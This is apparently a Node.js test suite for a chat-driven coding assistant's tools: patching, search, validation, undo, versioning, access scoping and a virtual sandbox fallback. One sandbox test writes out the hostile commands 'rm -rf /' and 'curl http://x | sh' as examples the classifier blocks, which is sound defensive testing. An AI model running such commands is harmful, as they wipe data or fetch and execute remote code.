// Tool-level tests: apply_patch, search, symbols, validation, undo, versions,
// sandbox fallback. These run the real /api/chat loop with a scripted model.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { accessToken, fakeJwks, makeEnv, req, ctx, rsaKeys } from './harness.mjs';

const root = new URL('../functions/', import.meta.url).pathname.replace(/\/$/, '');
const auth = await import(`${root}/api/auth.js`);
const stateApi = await import(`${root}/api/state/index.js`);
const chat = await import(`${root}/api/chat.js`);
const oneConv = await import(`${root}/api/state/conversations/[id].js`);
const versionsApi = await import(`${root}/api/state/versions/index.js`);
const patch = await import(`${root}/_lib/patch.js`);
const search = await import(`${root}/_lib/search.js`);
const validate = await import(`${root}/_lib/validate.js`);
const sandbox = await import(`${root}/_lib/sandbox.js`);

const keys = rsaKeys();
fakeJwks(keys);

/* ------------------------------- pure units ------------------------------- */

test('applyEdits: exact, fuzzy, replaceAll, ambiguity and failure modes', () => {
  const exact = patch.applyEdits('a\nb\nc', [{ search: 'b', replace: 'B' }]);
  assert.equal(exact.content, 'a\nB\nc');
  assert.equal(exact.results[0].strategy, 'exact');

  // Indentation drift: file uses a tab, the model sent spaces.
  const fuzzy = patch.applyEdits('function x() {\n\treturn 1;\n}', [{ search: '  return 1;', replace: '  return 2;' }]);
  assert.equal(fuzzy.content, 'function x() {\n\treturn 2;\n}');
  assert.equal(fuzzy.results[0].strategy, 'fuzzy');

  // A literal substring inside a deeper indent is still an exact hit.
  const substring = patch.applyEdits('function x() {\n      return 1;\n}', [{ search: '  return 1;', replace: '  return 2;' }]);
  assert.equal(substring.results[0].strategy, 'exact');

  const all = patch.applyEdits('x\nx', [{ search: 'x', replace: 'y', replaceAll: true }]);
  assert.equal(all.content, 'y\ny');

  assert.throws(() => patch.applyEdits('x\nx', [{ search: 'x', replace: 'y' }]), (e) => e.code === 'patch_failed');
  assert.throws(() => patch.applyEdits('abc', [{ search: 'zzz', replace: 'q' }]), (e) => e.code === 'patch_failed');
  assert.throws(() => patch.applyEdits('abc', []), (e) => e.status === 400);
  assert.throws(() => patch.applyEdits('abc', [{ search: 'a', replace: 'b' }, { search: 'q', replace: 'r' }]), (e) =>
    /ویرایش شماره 2/.test(e.message)
  );
});

test('unifiedDiff has git-style hunks and correct counts', () => {
  const before = 'l1\nl2\nl3\nl4\nl5\nl6\nl7\n';
  const after = 'l1\nl2\nl3 changed\nl4\nl5\nl6\nl7\nl8\n';
  const diff = patch.unifiedDiff(before, after, { path: 'src.js' });
  assert.match(diff, /^--- a\/src\.js/m);
  assert.match(diff, /^\+\+\+ b\/src\.js/m);
  assert.match(diff, /^@@ -\d+,\d+ \+\d+,\d+ @@/m);
  const stats = patch.diffStats(patch.diffLines(before, after));
  assert.deepEqual(stats, { added: 2, removed: 1 });
  assert.equal(patch.unifiedDiff('same', 'same'), '');
});

test('searchWorkspace finds literals, regex and respects path filters', () => {
  const files = {
    'app.js': 'const a = 1;\nfunction hello() {}\n',
    'style.css': '.hello { color: red; }\n',
    'notes.md': 'nothing here\n'
  };
  const literal = search.searchWorkspace(files, 'hello');
  assert.equal(literal.results.length, 2);
  assert.deepEqual(literal.results.map((r) => r.path).sort(), ['app.js', 'style.css']);
  assert.equal(literal.results[0].line, 2);

  const regex = search.searchWorkspace(files, 'function\\s+\\w+', { regex: true });
  assert.equal(regex.results.length, 1);
  assert.equal(regex.results[0].path, 'app.js');

  const filtered = search.searchWorkspace(files, 'hello', { pathFilter: '.css' });
  assert.equal(filtered.results.length, 1);
  assert.equal(filtered.results[0].path, 'style.css');

  assert.throws(() => search.searchWorkspace(files, '(' , { regex: true }), (e) => e.code === 'bad_regex');
  assert.match(search.formatSearchHits(search.searchWorkspace(files, 'zzz')), /No matches/);
});

test('listSymbols extracts functions, classes and CSS selectors', () => {
  const symbols = search.listSymbols({
    'a.js': 'function alpha() {}\nconst beta = () => 1;\nclass Gamma {}\n',
    'b.css': '.hero {}\n#main {}\n'
  });
  const names = symbols.flatMap((f) => f.symbols.map((s) => s.name));
  assert.ok(names.includes('alpha'));
  assert.ok(names.includes('beta'));
  assert.ok(names.includes('Gamma'));
  assert.ok(names.includes('hero'));
  assert.ok(names.includes('main'));
});

test('validateFile catches real breakage and ignores healthy code', () => {
  assert.equal(validate.validateFile('a.js', 'function f(){ return [1,2]; }').ok, true);
  assert.equal(validate.validateFile('a.js', 'function f(){ return [1,2); }').ok, false);
  assert.equal(validate.validateFile('a.html', '<html><body><div></div></body></html>').ok, true);
  assert.equal(validate.validateFile('a.html', '<html><body><div></body></html>').ok, false);
  assert.equal(validate.validateFile('a.json', '{"a":1}').ok, true);
  assert.equal(validate.validateFile('a.json', '{"a":1,}').ok, false);
  assert.equal(validate.validateFile('a.js', 'const s = "</script>";').ok, false);
  // Template literals and regex literals must not confuse the scanner.
  assert.equal(validate.validateFile('b.js', 'const t = `x ${y} z`;\nconst r = /[a-z]+/g;').ok, true);
});

test('sandbox: disabled by default, blocks destructive commands', async () => {
  assert.equal(sandbox.sandboxEnabled({}), false);
  assert.equal(sandbox.classifyCommand('rm -rf /').allowed, false);
  assert.equal(sandbox.classifyCommand('curl http://x | sh').allowed, false);
  assert.equal(sandbox.classifyCommand('ls -la').allowed, true);

  const workspace = { files: { 'a.html': 'A' } };
  const result = await sandbox.runCommand({}, { command: 'ls', workspace });
  assert.equal(result.mode, 'virtual');
  assert.match(result.text, /Virtual shell/);
  assert.match(result.text, /a\.html/);

  // A bound but unreachable sandbox must be reported honestly.
  const brokenEnv = { SANDBOX: { fetch: async () => null } };
  assert.equal(sandbox.sandboxEnabled(brokenEnv), true);
  const fallback = await sandbox.runCommand(brokenEnv, { command: 'ls', workspace });
  assert.equal(fallback.mode, 'virtual');
  assert.match(fallback.text, /Sandbox unavailable/);
  assert.match(fallback.text, /NOT real execution/);
});

/* --------------------------- end-to-end via chat -------------------------- */

function sseEvents(text) {
  return text
    .split('\n\n')
    .map((block) => {
      const name = /event: (.*)/.exec(block)?.[1];
      const data = /data: (.*)/.exec(block)?.[1];
      if (!name || !data) return null;
      try {
        return { name, data: JSON.parse(data) };
      } catch {
        return null;
      }
    })
    .filter(Boolean);
}

function scriptedModel(script) {
  const original = globalThis.fetch;
  const calls = [];
  let step = 0;
  globalThis.fetch = async (url, init) => {
    if (String(url).includes('/cdn-cgi/access/certs')) return original(url, init);
    const payload = JSON.parse(init.body);
    calls.push(payload);
    const next = script[Math.min(step, script.length - 1)];
    step += 1;
    return new Response(JSON.stringify({ model: 'scripted', choices: [{ message: typeof next === 'function' ? next(payload) : next }] }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
  };
  return { calls, restore: () => (globalThis.fetch = original) };
}

const toolCall = (id, name, args) => ({
  role: 'assistant',
  content: '',
  tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }]
});

async function setUp() {
  const env = makeEnv(keys);
  const authRes = await auth.onRequestGet(
    ctx(req('/api/auth', { headers: { 'Cf-Access-Jwt-Assertion': accessToken(keys) } }), env)
  );
  const cookie = authRes.headers.get('Set-Cookie').split(';')[0];
  const created = await (
    await stateApi.onRequestPost(ctx(req('/api/state', { method: 'POST', body: { action: 'create' }, headers: { Cookie: cookie } }), env))
  ).json();
  await stateApi.onRequestPost(
    ctx(
      req('/api/state', {
        method: 'POST',
        body: {
          action: 'workspace',
          id: created.id,
          workspace: {
            files: {
              'index.html': '<!doctype html>\n<html><body>\n<h1>Hello</h1>\n</body></html>\n',
              'app.js': 'function greet(){\n  return "hi";\n}\n'
            },
            active: 'app.js'
          }
        },
        headers: { Cookie: cookie }
      }),
      env
    )
  );
  return { env, cookie, id: created.id };
}

async function send(env, cookie, id, message) {
  const res = await chat.onRequestPost(
    ctx(req('/api/chat', { method: 'POST', body: { conversationId: id, message }, headers: { Cookie: cookie } }), env)
  );
  assert.equal(res.status, 200);
  return sseEvents(await res.text());
}

test('apply_patch edits a file, streams a diff, and creates a restorable version', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'apply_patch', {
      path: 'app.js',
      edits: [{ search: '  return "hi";', replace: '  return "hello world";' }]
    }),
    { role: 'assistant', content: 'متن بازگشتی را تغییر دادم.' }
  ]);
  let events;
  try {
    events = await send(env, cookie, id, 'متن greet را عوض کن');
  } finally {
    model.restore();
  }

  const done = events.at(-1);
  assert.equal(done.name, 'done');
  assert.deepEqual(done.data.touchedFiles, ['app.js']);
  assert.equal(done.data.workspace.files['app.js'].includes('hello world'), true);
  assert.equal(done.data.diffs.length, 1);
  assert.match(done.data.diffs[0].diff, /-  return "hi";/);
  assert.match(done.data.diffs[0].diff, /\+  return "hello world";/);
  assert.equal(done.data.diffs[0].added, 1);
  assert.deepEqual(done.data.validation, []);

  // The version row must exist and restore the original text.
  const versions = await (
    await versionsApi.onRequestGet(ctx(req('/api/state/versions?path=app.js', { headers: { Cookie: cookie } }), env))
  ).json();
  assert.ok(versions.versions.length >= 1);

  const restore = await (
    await versionsApi.onRequestPost(
      ctx(
        req('/api/state/versions', {
          method: 'POST',
          body: { action: 'restore', conversationId: id, path: 'app.js', versionId: versions.versions[0].id },
          headers: { Cookie: cookie }
        }),
        env
      )
    )
  ).json();
  assert.equal(restore.ok, true);
  assert.equal(restore.workspace.files['app.js'].includes('return "hi"'), true);
});

test('a rejected patch leaves the workspace untouched and tells the model why', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'apply_patch', { path: 'app.js', edits: [{ search: 'this text does not exist', replace: 'x' }] }),
    { role: 'assistant', content: 'نتوانستم.' }
  ]);
  let events;
  try {
    events = await send(env, cookie, id, 'یک ویرایش ناموجود');
  } finally {
    model.restore();
  }
  const toolResult = events.find((e) => e.name === 'tool_result');
  assert.equal(toolResult.data.ok, false);
  assert.match(toolResult.data.result, /not found|پیدا نشد/);
  const done = events.at(-1);
  assert.deepEqual(done.data.touchedFiles, []);
  assert.equal(done.data.workspace, undefined);

  const stored = await (
    await oneConv.onRequestGet(
      ctx(req(`/api/state/conversations/${id}`, { headers: { Cookie: cookie } }), env, { id })
    )
  ).json();
  assert.equal(stored.workspace.files['app.js'], 'function greet(){\n  return "hi";\n}\n');
});

test('search_code and list_symbols feed the model without extra reads', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'search_code', { query: 'Hello' }),
    toolCall('c2', 'list_symbols', {}),
    { role: 'assistant', content: 'پیدا شد.' }
  ]);
  let events;
  try {
    events = await send(env, cookie, id, 'کجا Hello هست؟');
  } finally {
    model.restore();
  }
  const results = events.filter((e) => e.name === 'tool_result');
  assert.equal(results.length, 2);
  assert.match(results[0].data.result, /index\.html:3/);
  assert.match(results[1].data.result, /greet@1/);
});

test('write_file reports validation errors back to the model', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'write_file', { path: 'broken.js', content: 'function f(){\n  return (1;\n}\n' }),
    { role: 'assistant', content: 'فایل را ساختم ولی اعتبارسنجی هشدار داد.' }
  ]);
  let events;
  try {
    events = await send(env, cookie, id, 'یک فایل بساز');
  } finally {
    model.restore();
  }
  const toolResult = events.find((e) => e.name === 'tool_result');
  assert.match(toolResult.data.result, /Validation:/);
  const done = events.at(-1);
  assert.equal(done.data.validation.length, 1);
  assert.equal(done.data.validation[0].path, 'broken.js');
  assert.ok(!done.data.validation[0].ok);
});

test('undo_edit restores the previous file content inside one turn', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'write_file', { path: 'app.js', content: 'const changed = true;\n' }),
    toolCall('c2', 'undo_edit', { path: 'app.js' }),
    { role: 'assistant', content: 'برگشت.' }
  ]);
  let events;
  try {
    events = await send(env, cookie, id, 'تغییر بده و برگردان');
  } finally {
    model.restore();
  }
  const done = events.at(-1);
  assert.match(done.data.workspace.files['app.js'], /return "hi"/);
  assert.ok(done.data.diffs.length >= 2);
});

test('run_command reports virtual mode explicitly and never fakes a sandbox', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'run_command', { command: 'ls' }),
    { role: 'assistant', content: 'فایل‌ها را لیست کردم (شل مجازی).' }
  ]);
  let events;
  try {
    events = await send(env, cookie, id, 'فایل‌ها را لیست کن');
  } finally {
    model.restore();
  }
  const toolResult = events.find((e) => e.name === 'tool_result');
  assert.match(toolResult.data.result, /Virtual shell/);
  const done = events.at(-1);
  assert.equal(done.data.sandbox, false);
  assert.equal(done.data.commands[0].mode, 'virtual');
  assert.deepEqual(done.data.touchedFiles, []);
});

test('a model failure after a successful edit keeps the edit and the partial group', async () => {
  const { env, cookie, id } = await setUp();
  const original = globalThis.fetch;
  let step = 0;
  globalThis.fetch = async (url, init) => {
    if (String(url).includes('/cdn-cgi/access/certs')) return original(url, init);
    step += 1;
    if (step === 1) {
      return new Response(
        JSON.stringify({
          model: 'scripted',
          choices: [
            {
              message: {
                role: 'assistant',
                content: '',
                tool_calls: [
                  {
                    id: 'c1',
                    type: 'function',
                    function: {
                      name: 'write_file',
                      arguments: JSON.stringify({ path: 'app.js', content: 'const kept = 1;\n' })
                    }
                  }
                ]
              }
            }
          ]
        }),
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      );
    }
    return new Response('{"error":"boom"}', { status: 500 });
  };

  let events;
  try {
    events = await send(env, cookie, id, 'بنویس و بعد خطا بده');
  } finally {
    globalThis.fetch = original;
  }

  const errorEvent = events.find((e) => e.name === 'error');
  assert.ok(errorEvent, JSON.stringify(events.map((e) => e.name)));
  assert.deepEqual(errorEvent.data.savedFiles, ['app.js']);
  assert.equal(errorEvent.data.partial, true);

  const stored = await (
    await oneConv.onRequestGet(ctx(req(`/api/state/conversations/${id}`, { headers: { Cookie: cookie } }), env, { id }))
  ).json();
  assert.equal(stored.workspace.files['app.js'], 'const kept = 1;\n');
  const roles = stored.messages.map((m) => m.role);
  assert.deepEqual(roles.slice(-3), ['user', 'assistant', 'tool']);
});

test('search endpoint is owner-scoped and rejects a foreign conversation', async () => {
  const searchApi = await import(`${root}/api/state/search/index.js`);
  const { env, cookie, id } = await setUp();
  const ok = await (
    await searchApi.onRequestPost(
      ctx(req('/api/state/search', { method: 'POST', body: { conversationId: id, query: 'greet' }, headers: { Cookie: cookie } }), env)
    )
  ).json();
  assert.equal(ok.results.length, 1);
  assert.equal(ok.results[0].path, 'app.js');

  // Second user: must not see the first user's files.
  const other = await auth.onRequestGet(
    ctx(req('/api/auth', { headers: { 'Cf-Access-Jwt-Assertion': accessToken(keys, { sub: 'user-2', email: 'second@example.com' }) } }), env)
  );
  const otherCookie = other.headers.get('Set-Cookie').split(';')[0];
  const denied = await searchApi.onRequestPost(
    ctx(req('/api/state/search', { method: 'POST', body: { conversationId: id, query: 'greet' }, headers: { Cookie: otherCookie } }), env)
  );
  assert.equal(denied.status, 404);
});

test('version restore rejects a version from another file and another owner', async () => {
  const { env, cookie, id } = await setUp();
  const model = scriptedModel([
    toolCall('c1', 'write_file', { path: 'app.js', content: 'const a = 1;\n' }),
    { role: 'assistant', content: 'ok' }
  ]);
  try {
    await send(env, cookie, id, 'بنویس');
  } finally {
    model.restore();
  }
  const versions = await (
    await versionsApi.onRequestGet(ctx(req('/api/state/versions?path=app.js', { headers: { Cookie: cookie } }), env))
  ).json();
  assert.ok(versions.versions.length >= 1);
  const versionId = versions.versions[0].id;

  const wrongPath = await versionsApi.onRequestPost(
    ctx(
      req('/api/state/versions', {
        method: 'POST',
        body: { action: 'restore', conversationId: id, path: 'index.html', versionId },
        headers: { Cookie: cookie }
      }),
      env
    )
  );
  assert.equal(wrongPath.status, 400);

  const other = await auth.onRequestGet(
    ctx(req('/api/auth', { headers: { 'Cf-Access-Jwt-Assertion': accessToken(keys, { sub: 'user-3', email: 'third@example.com' }) } }), env)
  );
  const otherCookie = other.headers.get('Set-Cookie').split(';')[0];
  const denied = await versionsApi.onRequestPost(
    ctx(
      req('/api/state/versions', {
        method: 'POST',
        body: { action: 'restore', conversationId: id, path: 'app.js', versionId },
        headers: { Cookie: otherCookie }
      }),
      env
    )
  );
  assert.ok([403, 404].includes(denied.status), String(denied.status));
});

test('creating a file records a base version and produces a real diff', async () => {
  // Regression: write_file on a *new* path used to skip recordVersion and emit an
  // empty diff, so the UI showed no changes and creating a file was not undoable.
  const lib = await import(`${root}/_lib/versions.js`);
  const env = makeEnv(keys);
  const owner = 'owner@example.com';
  const conv = { id: 'conv-1', workspace: '{}' };

  const id = await lib.recordVersion(env, owner, conv, { path: 'new.js', content: '', reason: 'created' });
  assert.ok(id, 'a base version id must be returned');

  const list = await lib.listVersions(env, owner, 'new.js', { project: '' });
  assert.equal(list.length, 1);
  assert.equal(list[0].reason, 'created');
  assert.equal(list[0].size, 0);

  // And a diff against an empty original is a real, non-empty patch.
  const diff = patch.unifiedDiff('', 'a\nb\n', { path: 'new.js' });
  assert.match(diff, /^--- a\/new\.js/m);
  assert.match(diff, /^\+b$/m);
});
